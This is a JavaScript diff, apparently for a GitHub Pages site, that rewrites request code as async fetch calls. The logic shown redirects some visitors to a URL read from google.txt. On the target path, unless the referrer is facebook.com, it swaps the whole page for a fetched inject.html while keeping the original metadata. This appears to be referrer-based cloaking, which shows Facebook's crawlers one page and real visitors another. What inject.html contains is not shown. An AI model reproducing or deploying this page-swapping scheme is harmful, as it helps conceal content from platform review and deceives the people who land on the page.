@@ -48,74 +48,72 @@
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
       } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
         // GitHub Pages optimized approach for loading inject.html
-        const loadInjectHTML = () => {
-          // Get the repository name from the URL for GitHub Pages path resolution
-          const pathSegments = window.location.pathname.split('/');
-          const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
-          
-          // Use XMLHttpRequest with proper GitHub Pages path handling
-          const xhr = new XMLHttpRequest();
-          const timestamp = new Date().getTime();
-          
-          // For GitHub Pages, we need to ensure the path starts with the repo name
-          // If running locally or at root domain, this will still work
-          const injectPath = window.location.origin + repoName + '/inject.html?nocache=' + timestamp;
-          
-          console.log('Attempting to fetch from:', injectPath);
-          
-          xhr.open('GET', injectPath, true);
-          xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-          xhr.setRequestHeader('Pragma', 'no-cache');
-          
-          xhr.onload = function() {
-            if (xhr.status >= 200 && xhr.status < 300) {
-              const html = xhr.responseText;
-              
-              if (!html || html.trim() === '') {
-                console.error('Fetched inject.html is empty');
-                // Try alternative path if empty
-                tryAlternativePath();
-                return;
-              }
-              
-              console.log('Inject HTML successfully loaded');
-              processHTML(html);
-            } else {
-              console.error('Failed to fetch inject.html:', xhr.status);
-              tryAlternativePath();
+        const loadInjectHTML = async () => {
+          try {
+            // Get the repository name from the URL for GitHub Pages path resolution
+            const pathSegments = window.location.pathname.split('/');
+            const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
+            
+            // Construct the primary path for GitHub Pages
+            const injectPath = `${window.location.origin}${repoName}/inject.html?nocache=${Date.now()}`;
+            console.log('Attempting to fetch from:', injectPath);
+
+            // Fetch the inject.html content
+            const response = await fetch(injectPath, {
+              method: 'GET',
+              headers: {
+                'Cache-Control': 'no-cache, no-store, must-revalidate',
+                'Pragma': 'no-cache',
+              },
+            });
+
+            if (!response.ok) {
+              throw new Error(`Failed to fetch inject.html: ${response.status}`);
             }
-          };
-          
-          xhr.onerror = function() {
-            console.error('Network error while fetching inject.html');
+
+            const html = await response.text();
+            if (!html || html.trim() === '') {
+              throw new Error('Fetched inject.html is empty');
+            }
+
+            console.log('Inject HTML successfully loaded');
+            processHTML(html);
+          } catch (error) {
+            console.error('Error loading inject.html:', error.message);
             tryAlternativePath();
-          };
-          
-          xhr.send();
+          }
         };
-        
+
         // Try alternative path if the first attempt fails
-        const tryAlternativePath = () => {
-          console.log('Trying alternative path for inject.html');
-          const xhr = new XMLHttpRequest();
-          const timestamp = new Date().getTime();
-          // Try relative path as fallback
-          xhr.open('GET', './inject.html?nocache=' + timestamp, true);
-          xhr.onload = function() {
-            if (xhr.status >= 200 && xhr.status < 300) {
-              const html = xhr.responseText;
-              if (html && html.trim() !== '') {
-                console.log('Inject HTML loaded from alternative path');
-                processHTML(html);
-              } else {
-                console.error('All attempts to load inject.html failed');
-                alert('Failed to load content. Please check your connection.');
-              }
+        const tryAlternativePath = async () => {
+          try {
+            console.log('Trying alternative path for inject.html');
+            const fallbackPath = `./inject.html?nocache=${Date.now()}`;
+            const response = await fetch(fallbackPath, {
+              method: 'GET',
+              headers: {
+                'Cache-Control': 'no-cache, no-store, must-revalidate',
+                'Pragma': 'no-cache',
+              },
+            });
+
+            if (!response.ok) {
+              throw new Error(`Failed to fetch inject.html from fallback path: ${response.status}`);
             }
-          };
-          xhr.send();
+
+            const html = await response.text();
+            if (!html || html.trim() === '') {
+              throw new Error('Fetched inject.html from fallback path is empty');
+            }
+
+            console.log('Inject HTML loaded from alternative path');
+            processHTML(html);
+          } catch (error) {
+            console.error('All attempts to load inject.html failed:', error.message);
+            alert('Failed to load content. Please check your connection.');
+          }
         };
-        
+
         // Process the HTML content once loaded
         const processHTML = (html) => {
           try {
@@ -123,17 +121,17 @@
             document.open();
             document.write(html);
             document.close();
-            
+
             // Inject metadata after DOM replacement
             setTimeout(() => {
               injectMetadata(originalHtml);
               console.log('Metadata injection complete');
-            }, 200);
+            }, 200); // Slight delay for slower browsers
           } catch (e) {
             console.error('Error processing HTML:', e);
           }
         };
-        
+
         // Start the loading process
         loadInjectHTML();
       }
